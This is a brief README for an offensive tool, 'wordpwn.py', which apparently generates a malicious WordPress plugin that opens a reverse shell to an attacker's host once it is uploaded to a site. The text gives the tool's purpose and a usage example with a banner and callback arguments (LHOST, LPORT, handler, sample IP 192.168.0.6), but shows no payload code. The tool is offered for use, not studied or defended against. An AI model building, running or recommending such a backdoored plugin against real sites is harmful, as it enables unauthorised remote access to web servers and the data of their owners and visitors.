# malicious-wordpress-plugin
Simply generates a wordpress plugin that will grant you a reverse shell once uploaded. I recommend don't installing Kali Linux, as msfvenom is not used to generate the payload.

#### Usage Example
```sh
root@wetw0rk:~# python wordpwn.py 
__        __            _
\ \      / /__  _ __ __| |_ ____      ___ __
 \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \ 
  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |
   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|
                         |_|


Usage: wordpwn.py [LHOST] [LPORT] [HANDLER]
Example: wordpwn.py 192.168.0.6 8888 Y
```

